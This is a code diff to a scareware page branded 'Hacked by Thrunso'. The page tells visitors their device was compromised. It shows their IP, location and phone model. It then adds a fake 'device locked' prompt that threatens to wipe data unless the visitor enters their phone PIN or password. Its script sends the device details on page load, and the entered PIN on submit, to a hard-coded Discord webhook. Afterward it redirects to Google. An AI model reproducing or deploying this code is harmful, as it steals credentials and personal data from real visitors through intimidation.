@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Security Alert</title>
+    <title>Hacked by Thrunso</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Arial, sans-serif;
+            font-family: 'Courier New', monospace;
         }
         body {
             background: #0a0a0f;
@@ -18,126 +18,397 @@
             align-items: center;
             min-height: 100vh;
             padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        /* Matrix rain background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, 
+                rgba(0, 255, 0, 0.02) 0px, 
+                rgba(0, 255, 0, 0.02) 2px,
+                transparent 2px,
+                transparent 6px
+            );
+            pointer-events: none;
+            z-index: 0;
+            animation: matrixScroll 20s linear infinite;
+        }
+        @keyframes matrixScroll {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(100px); }
+        }
+        /* Glitch lines */
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg,
+                transparent 0px,
+                transparent 3px,
+                rgba(255, 0, 0, 0.03) 3px,
+                rgba(255, 0, 0, 0.03) 4px,
+                transparent 4px,
+                transparent 8px
+            );
+            pointer-events: none;
+            z-index: 0;
         }
         .container {
-            background: #1a1a2e;
+            background: rgba(10, 10, 15, 0.92);
             border-radius: 16px;
             padding: 40px 30px;
-            max-width: 420px;
+            max-width: 440px;
             width: 100%;
-            border: 1px solid #ff0040;
-            box-shadow: 0 0 60px rgba(255, 0, 60, 0.2);
+            border: 2px solid #ff0040;
+            box-shadow: 0 0 80px rgba(255, 0, 60, 0.3), inset 0 0 80px rgba(255, 0, 60, 0.05);
             text-align: center;
+            position: relative;
+            z-index: 1;
+            backdrop-filter: blur(4px);
+        }
+        /* Glitch effect on border */
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            border-radius: 18px;
+            background: linear-gradient(45deg, #ff0040, transparent, #ff0040, transparent);
+            background-size: 400% 400%;
+            z-index: -1;
+            animation: glitchBorder 3s ease infinite;
+            opacity: 0.6;
+        }
+        @keyframes glitchBorder {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .hacked-tag {
+            color: #ff0040;
+            font-size: 14px;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            font-weight: 700;
+            margin-bottom: 8px;
+            text-shadow: 0 0 20px rgba(255, 0, 60, 0.5);
+        }
+        .hacked-tag span {
+            display: inline-block;
+            animation: flicker 2s infinite;
+        }
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            92% { opacity: 1; }
+            93% { opacity: 0; }
+            94% { opacity: 0.5; }
+            95% { opacity: 1; }
         }
         .icon {
             font-size: 56px;
-            margin-bottom: 20px;
+            margin-bottom: 12px;
+            filter: drop-shadow(0 0 30px rgba(255, 0, 60, 0.3));
         }
         h1 {
             color: #ff0040;
-            font-size: 22px;
-            margin-bottom: 16px;
+            font-size: 20px;
+            margin-bottom: 6px;
             text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 30px rgba(255, 0, 60, 0.3);
+        }
+        .subtitle {
+            color: #ff6666;
+            font-size: 13px;
             letter-spacing: 1px;
+            margin-bottom: 16px;
+            opacity: 0.8;
         }
         p {
-            color: #cccccc;
-            font-size: 15px;
+            color: #88aa88;
+            font-size: 14px;
             line-height: 1.6;
             margin-bottom: 10px;
         }
         .data-box {
-            background: #0d0d1a;
+            background: rgba(0, 0, 0, 0.6);
             border-radius: 10px;
             padding: 16px;
-            margin: 20px 0;
+            margin: 16px 0;
             border: 1px solid #2a2a40;
             text-align: left;
             font-size: 13px;
-            color: #aaa;
+            color: #88aa88;
             word-break: break-all;
+            box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.5);
         }
         .data-box span {
             color: #ff0040;
             font-weight: 700;
         }
+        .data-box .value {
+            color: #00ff88;
+            font-weight: 400;
+        }
         .warning {
             color: #ff6666;
-            font-size: 13px;
+            font-size: 12px;
             margin-top: 10px;
             border-top: 1px solid #2a2a40;
-            padding-top: 16px;
+            padding-top: 14px;
+            letter-spacing: 1px;
+        }
+        .pin-box {
+            margin-top: 16px;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 10px;
+            padding: 16px;
+            border: 1px solid #ff0040;
+            box-shadow: 0 0 40px rgba(255, 0, 60, 0.1);
+        }
+        .pin-box p {
+            color: #ff6666;
+            font-size: 13px;
+        }
+        .pin-box input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #2a2a40;
+            background: #0a0a0f;
+            color: #00ff88;
+            font-size: 16px;
+            text-align: center;
+            letter-spacing: 8px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.5);
+        }
+        .pin-box input:focus {
+            outline: none;
+            border-color: #ff0040;
+            box-shadow: 0 0 30px rgba(255, 0, 60, 0.2);
+        }
+        .pin-box button {
+            width: 100%;
+            padding: 12px;
+            background: #ff0040;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: all 0.3s;
+            box-shadow: 0 0 30px rgba(255, 0, 60, 0.2);
+        }
+        .pin-box button:hover {
+            background: #cc0033;
+            box-shadow: 0 0 60px rgba(255, 0, 60, 0.4);
+            transform: scale(1.02);
+        }
+        .pin-box button:active {
+            transform: scale(0.98);
+        }
+        .hidden {
+            display: none;
+        }
+        .glitch-text {
+            color: #ff0040;
+            font-size: 11px;
+            letter-spacing: 2px;
+            opacity: 0.6;
+            margin-top: 12px;
+            animation: glitchText 4s infinite;
+        }
+        @keyframes glitchText {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="icon">📱</div>
-    <h1>⚠️ Your Phone Information Has Been Stolen</h1>
-    <p>Your device data was accessed remotely.</p>
-
-    <div class="data-box" id="infoBox">
-        <div>📡 <span>IP:</span> <span id="ip">Fetching...</span></div>
-        <div>📍 <span>Location:</span> <span id="location">Fetching...</span></div>
-        <div>💻 <span>Device:</span> <span id="device">Fetching...</span></div>
-        <div>🌐 <span>Browser:</span> <span id="browser">Fetching...</span></div>
-        <div>📐 <span>Screen:</span> <span id="screen">Fetching...</span></div>
-        <div>⏰ <span>Time:</span> <span id="time">Fetching...</span></div>
+    <!-- HACKED BY THRUNSO -->
+    <div class="hacked-tag">
+        <span>⛓️ HACKED BY THRUNSO ⛓️</span>
     </div>
 
-    <p style="font-size:13px; color:#888;">This data has been logged.</p>
-    <div class="warning">🔒 Your device is now flagged.</div>
+    <div class="icon">💀</div>
+    <h1>⚠️ SYSTEM COMPROMISED</h1>
+    <p class="subtitle">Your device has been remotely accessed</p>
+
+    <div class="data-box" id="infoBox">
+        <div>📡 <span>IP:</span> <span class="value" id="ip">Fetching...</span></div>
+        <div>📍 <span>Location:</span> <span class="value" id="location">Fetching...</span></div>
+        <div>📱 <span>Phone Model:</span> <span class="value" id="phoneModel">Fetching...</span></div>
+        <div>💻 <span>OS:</span> <span class="value" id="os">Fetching...</span></div>
+        <div>🌐 <span>Browser:</span> <span class="value" id="browser">Fetching...</span></div>
+        <div>📐 <span>Screen:</span> <span class="value" id="screen">Fetching...</span></div>
+        <div>⏰ <span>Time:</span> <span class="value" id="time">Fetching...</span></div>
+    </div>
+
+    <!-- FAKE PIN PROMPT -->
+    <div class="pin-box" id="pinBox">
+        <p>🔒 DEVICE LOCKED — VERIFY TO UNLOCK</p>
+        <p style="font-size:12px; color:#88aa88;">Enter your phone PIN/password to decrypt your data</p>
+        <input type="password" id="pinInput" placeholder="Enter PIN or Password" maxlength="20" />
+        <button id="pinSubmit">▶ UNLOCK DEVICE</button>
+        <p style="font-size:10px; color:#555; margin-top:8px;">⛓️ Your data will be wiped if you don't verify</p>
+    </div>
+
+    <div class="glitch-text">⛓️ SESSION LOGGED ⛓️</div>
+    <div class="warning">⚠️ YOUR DEVICE IS NOW FLAGGED</div>
 </div>
 
 <script>
     // ===== YOUR WEBHOOK =====
     var WEBHOOK = "https://discord.com/api/webhooks/1519652009781887076/37_FqW5wKYAUNdvThxMxjArmVmtLJb0m8oC5JSW3oYfC5libvf_9Cg3vbmL0-IBg961O";
 
+    // ===== GET PHONE MODEL FROM USER AGENT =====
+    function getPhoneModel() {
+        var ua = navigator.userAgent || '';
+        var model = 'Unknown';
+
+        // iPhone models
+        if (ua.indexOf('iPhone') !== -1) {
+            var match = ua.match(/iPhone\s(\d+,\d+)/);
+            if (match) {
+                var models = {
+                    '14,5': 'iPhone 13',
+                    '14,4': 'iPhone 13 Mini',
+                    '14,2': 'iPhone 13 Pro',
+                    '14,3': 'iPhone 13 Pro Max',
+                    '14,7': 'iPhone 14',
+                    '14,8': 'iPhone 14 Plus',
+                    '15,2': 'iPhone 14 Pro',
+                    '15,3': 'iPhone 14 Pro Max',
+                    '15,4': 'iPhone 15',
+                    '15,5': 'iPhone 15 Plus',
+                    '16,1': 'iPhone 15 Pro',
+                    '16,2': 'iPhone 15 Pro Max',
+                    '17,1': 'iPhone 16',
+                    '17,2': 'iPhone 16 Plus',
+                    '17,3': 'iPhone 16 Pro',
+                    '17,4': 'iPhone 16 Pro Max'
+                };
+                model = models[match[1]] || 'iPhone ' + match[1];
+            } else {
+                model = 'iPhone';
+            }
+        }
+        // Android models
+        else if (ua.indexOf('Android') !== -1) {
+            var match = ua.match(/;\s([^;]+?)\sBuild/);
+            if (match) {
+                model = match[1];
+            } else {
+                model = 'Android Device';
+            }
+        }
+        // Desktop
+        else if (ua.indexOf('Windows') !== -1) {
+            model = 'Windows PC';
+        } else if (ua.indexOf('Mac') !== -1) {
+            var match = ua.match(/Macintosh;\s.*Mac OS X\s([\d_]+)/);
+            if (match) {
+                model = 'Mac ' + match[1].replace(/_/g, '.');
+            } else {
+                model = 'Mac';
+            }
+        } else if (ua.indexOf('Linux') !== -1) {
+            model = 'Linux PC';
+        }
+
+        return model;
+    }
+
+    // ===== GET OS VERSION =====
+    function getOS() {
+        var ua = navigator.userAgent || '';
+        if (ua.indexOf('Android') !== -1) {
+            var match = ua.match(/Android\s([\d.]+)/);
+            return match ? 'Android ' + match[1] : 'Android';
+        }
+        if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
+            var match = ua.match(/OS\s([\d_]+)/);
+            return match ? 'iOS ' + match[1].replace(/_/g, '.') : 'iOS';
+        }
+        if (ua.indexOf('Windows NT 10.0') !== -1) return 'Windows 10/11';
+        if (ua.indexOf('Windows NT 6.1') !== -1) return 'Windows 7';
+        if (ua.indexOf('Windows') !== -1) return 'Windows';
+        if (ua.indexOf('Mac OS X') !== -1) {
+            var match = ua.match(/Mac OS X\s([\d_]+)/);
+            return match ? 'macOS ' + match[1].replace(/_/g, '.') : 'macOS';
+        }
+        if (ua.indexOf('Linux') !== -1) return 'Linux';
+        return 'Unknown OS';
+    }
+
     // ===== UPDATE PAGE =====
     function updatePage(info) {
         document.getElementById('ip').textContent = info.ip || 'Unknown';
         document.getElementById('location').textContent = info.location || 'Unknown';
-        document.getElementById('device').textContent = info.device || 'Unknown';
+        document.getElementById('phoneModel').textContent = info.phoneModel || 'Unknown';
+        document.getElementById('os').textContent = info.os || 'Unknown';
         document.getElementById('browser').textContent = info.browser || 'Unknown';
         document.getElementById('screen').textContent = info.screen || 'Unknown';
         document.getElementById('time').textContent = info.time || 'Unknown';
     }
 
     // ===== SEND TO DISCORD =====
-    function sendToDiscord(info) {
+    function sendToDiscord(info, pin) {
         if (!info) return;
-        var msg = '**📱 Device Info Stolen**\n' +
+        var msg = '**💀 HACKED BY THRUNSO**\n' +
             'IP: ' + info.ip + '\n' +
             'Location: ' + info.location + '\n' +
-            'Device: ' + info.device + '\n' +
+            'Phone Model: ' + info.phoneModel + '\n' +
+            'OS: ' + info.os + '\n' +
             'Browser: ' + info.browser + '\n' +
             'Screen: ' + info.screen + '\n' +
             'Time: ' + info.time + '\n' +
             'User Agent: `' + navigator.userAgent + '`';
+
+        if (pin) {
+            msg += '\n\n**🔒 PIN/Password Entered:** `' + pin + '`';
+        }
 
         fetch(WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 content: msg,
-                username: 'Scare Grabber'
+                username: 'Thrunso'
             })
         }).catch(function() {});
     }
 
-    // ===== GET IP + LOCATION (MULTIPLE APIS) =====
+    // ===== GET IP + LOCATION =====
     function getIPAndLocation() {
         var info = {
             ip: 'Unknown',
             location: 'Unknown',
-            device: navigator.platform || 'Unknown',
+            phoneModel: getPhoneModel(),
+            os: getOS(),
             browser: navigator.userAgent.split(' ').pop() || 'Unknown',
             screen: screen.width + 'x' + screen.height,
             time: new Date().toLocaleString()
         };
 
-        // Try ipapi.co first
         fetch('https://ipapi.co/json/')
             .then(function(r) { return r.json(); })
             .then(function(data) {
@@ -147,44 +418,40 @@
                     updatePage(info);
                     sendToDiscord(info);
                 } else {
-                    fallbackIP(info);
+                    updatePage(info);
+                    sendToDiscord(info);
                 }
             })
             .catch(function() {
-                fallbackIP(info);
+                updatePage(info);
+                sendToDiscord(info);
             });
 
-        // Fallback: ipify + ip-api.com
-        function fallbackIP(info) {
-            fetch('https://api.ipify.org?format=json')
-                .then(function(r) { return r.json(); })
-                .then(function(data) {
-                    if (data && data.ip) {
-                        info.ip = data.ip;
-                        return fetch('https://ip-api.com/json/' + data.ip);
-                    }
-                    throw new Error('No IP');
-                })
-                .then(function(r) { return r.json(); })
-                .then(function(data) {
-                    if (data && data.city) {
-                        info.location = (data.city || 'Unknown') + ', ' + (data.country || 'Unknown');
-                    } else {
-                        info.location = 'Unknown';
-                    }
-                    updatePage(info);
-                    sendToDiscord(info);
-                })
-                .catch(function() {
-                    // Final fallback: show what we have
-                    updatePage(info);
-                    sendToDiscord(info);
-                });
-        }
-
-        // Update page immediately with basic info
         updatePage(info);
     }
+
+    // ===== FAKE PIN =====
+    document.getElementById('pinSubmit').addEventListener('click', function() {
+        var pin = document.getElementById('pinInput').value.trim();
+        if (pin.length > 0) {
+            var info = {
+                ip: document.getElementById('ip').textContent,
+                location: document.getElementById('location').textContent,
+                phoneModel: document.getElementById('phoneModel').textContent,
+                os: document.getElementById('os').textContent,
+                browser: document.getElementById('browser').textContent,
+                screen: document.getElementById('screen').textContent,
+                time: document.getElementById('time').textContent
+            };
+            sendToDiscord(info, pin);
+            document.getElementById('pinBox').innerHTML = '<p style="color:#00ff88;">✅ DECRYPTED. Redirecting...</p>';
+            setTimeout(function() {
+                window.location.href = 'https://www.google.com';
+            }, 1500);
+        } else {
+            alert('⚠️ Enter your PIN/password.');
+        }
+    });
 
     // ===== RUN =====
     getIPAndLocation();
